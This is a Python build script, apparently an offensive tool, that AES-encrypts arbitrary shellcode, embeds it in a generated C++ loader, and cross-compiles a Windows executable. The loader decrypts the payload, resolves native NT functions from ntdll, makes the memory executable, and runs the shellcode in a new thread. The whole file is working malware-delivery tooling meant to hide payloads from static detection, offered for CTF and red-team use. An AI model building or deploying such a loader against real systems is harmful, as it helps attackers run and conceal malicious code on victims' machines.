#!/usr/bin/env python3

# Author : PaiN05
# Shellcode Runner For CTF or some Red Teaming Engagements

import argparse
import subprocess
import os
import hashlib
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


CPP_FILE = "aes_nt_runner.cpp"
INC_FILE = "meow.inc"
EXE_FILE = "runner.exe" # Final OutPut File Name

# KEY DERIVATION
def derive_key_iv(password: str):
    digest = hashlib.sha256(password.encode()).digest()
    return digest[:16], digest[16:32]

# C++ TEMPLATE 
CPP_TEMPLATE = r'''
#include <windows.h>
#include <wincrypt.h>

#pragma comment(lib, "advapi32.lib")

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE, ACCESS_MASK, PVOID, HANDLE, PVOID, PVOID,
    ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

#include "meow.inc"

unsigned char aes_key[16] = {
    {AES_KEY}
};

bool AESDecrypt(
    unsigned char* encrypted,
    DWORD encLen,
    unsigned char* key,
    unsigned char* iv,
    unsigned char** output,
    DWORD* outLen)
{
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;

    *output = new unsigned char[encLen];
    memcpy(*output, encrypted, encLen);
    *outLen = encLen;

    if (!CryptAcquireContext(
        &hProv, NULL, NULL,
        PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return false;

    struct {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE key[16];
    } keyBlob;

    keyBlob.hdr.bType = PLAINTEXTKEYBLOB;
    keyBlob.hdr.bVersion = CUR_BLOB_VERSION;
    keyBlob.hdr.reserved = 0;
    keyBlob.hdr.aiKeyAlg = CALG_AES_128;
    keyBlob.keyLen = 16;
    memcpy(keyBlob.key, key, 16);

    if (!CryptImportKey(
        hProv,
        (BYTE*)&keyBlob,
        sizeof(keyBlob),
        0,
        0,
        &hKey))
        return false;

    CryptSetKeyParam(hKey, KP_IV, iv, 0);

    if (!CryptDecrypt(
        hKey,
        0,
        TRUE,
        0,
        *output,
        outLen))
        return false;

    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    return true;
}

int main()
{
    unsigned char* decrypted = nullptr;
    DWORD decryptedLen = 0;

    if (!AESDecrypt(
        encrypted_shellcode,
        encrypted_shellcode_len,
        aes_key,
        aes_iv,
        &decrypted,
        &decryptedLen))
        return -1;

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");

    auto NtAllocateVirtualMemory =
        (NtAllocateVirtualMemory_t)GetProcAddress(
            ntdll, "NtAllocateVirtualMemory");

    auto NtProtectVirtualMemory =
        (NtProtectVirtualMemory_t)GetProcAddress(
            ntdll, "NtProtectVirtualMemory");

    auto NtCreateThreadEx =
        (NtCreateThreadEx_t)GetProcAddress(
            ntdll, "NtCreateThreadEx");

    PVOID base = nullptr;
    SIZE_T size = decryptedLen;

    NtAllocateVirtualMemory(
        (HANDLE)-1,
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE);

    memcpy(base, decrypted, decryptedLen);

    ULONG oldProtect;
    NtProtectVirtualMemory(
        (HANDLE)-1,
        &base,
        &size,
        PAGE_EXECUTE_READ,
        &oldProtect);

    HANDLE hThread = NULL;
    NtCreateThreadEx(
        &hThread,
        THREAD_ALL_ACCESS,
        NULL,
        (HANDLE)-1,
        base,
        NULL,
        FALSE,
        0, 0, 0, NULL);

    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
'''

# ENCRYPT + INC 
def encrypt_shellcode(shellcode_path, password):
    key, iv = derive_key_iv(password)

    with open(shellcode_path, "rb") as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))

    with open(INC_FILE, "w") as f:
        f.write("unsigned char encrypted_shellcode[] = {\n")
        for i in range(0, len(encrypted), 16):
            chunk = ", ".join(f"0x{b:02x}" for b in encrypted[i:i+16])
            f.write(f"    {chunk},\n")
        f.write("};\n")
        f.write(f"unsigned int encrypted_shellcode_len = {len(encrypted)};\n\n")

        f.write("unsigned char aes_iv[] = {\n    ")
        f.write(", ".join(f"0x{b:02x}" for b in iv))
        f.write("\n};\n")

    return key

# WRITE CPP 
def write_cpp(key_bytes):
    key_str = ", ".join(f"0x{b:02x}" for b in key_bytes)
    cpp_code = CPP_TEMPLATE.replace("{AES_KEY}", key_str)

    with open(CPP_FILE, "w") as f:
        f.write(cpp_code)

# COMPILE 
def compile_exe():
    subprocess.run([
        "x86_64-w64-mingw32-g++",
        CPP_FILE,
        "-o", EXE_FILE,
        "-static",
        "-ladvapi32"
    ], check=True)

# MAIN
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("shellcode", help="shellcode.bin")
    parser.add_argument("--aes", required=True, help="AES password")
    parser.add_argument("--compile", action="store_true")
    args = parser.parse_args()

    key = encrypt_shellcode(args.shellcode, args.aes)
    write_cpp(key)

    if args.compile:
        compile_exe()
        os.remove(INC_FILE)
        print(f"[+] Build complete: {EXE_FILE}")

if __name__ == "__main__":
    main()